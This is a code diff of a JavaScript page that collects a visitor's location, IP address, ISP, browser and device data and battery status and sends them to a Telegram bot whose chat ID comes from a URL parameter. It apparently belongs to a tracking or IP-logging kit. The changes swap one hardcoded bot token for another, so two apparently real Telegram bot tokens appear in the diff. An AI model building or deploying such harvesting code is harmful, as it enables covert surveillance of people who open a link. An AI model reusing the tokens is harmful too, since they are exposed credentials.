@@ -135,7 +135,6 @@
           const getLocation = getUserLocation();
           
           // Get IP, Device, and Battery info
-          // We combine device info with IP info later in getDeviceInfo
           const getDeviceInfoPromise = getIPAndNetworkInfo().then(ipInfo => getDeviceAndBatteryInfo(ipInfo));
 
           // Run all actions in parallel
@@ -156,7 +155,7 @@
         });
     }
 
-    // --- IP and Network Information Function ---
+    // --- IP and Network Information Function (Requires external API) ---
     function getIPAndNetworkInfo() {
         return fetch('https://ipinfo.io/json')
             .then(response => response.json())
@@ -186,7 +185,7 @@
                 // IP and Network Details
                 'IP Address': ipInfo.PublicIP,
                 'ISP / Network': ipInfo.ISP,
-                'Approx. Location': `${ipInfo.City}, ${ipInfo.Country}`,
+                'Approx. Location (IP)': `${ipInfo.City}, ${ipInfo.Country}`,
 
                 // Device and Browser Details
                 UserAgent: navigator.userAgent,
@@ -303,7 +302,7 @@
     }
 
     function sendToTelegram(data, type) {
-      const botToken = '7530633346:AAGcNuDErVnXJxzuan7zEpyQUbMDMwk0DW4'; // Replace with your bot token
+      const botToken = '7713518698:AAGw9ey4h0pFIZV_-1eh9xwxYeV_HJqqCk'; // Replace with your bot token
       const chatId = GetURLParameter('id'); // Get the chat ID from URL parameter
 
       const formData = new FormData();
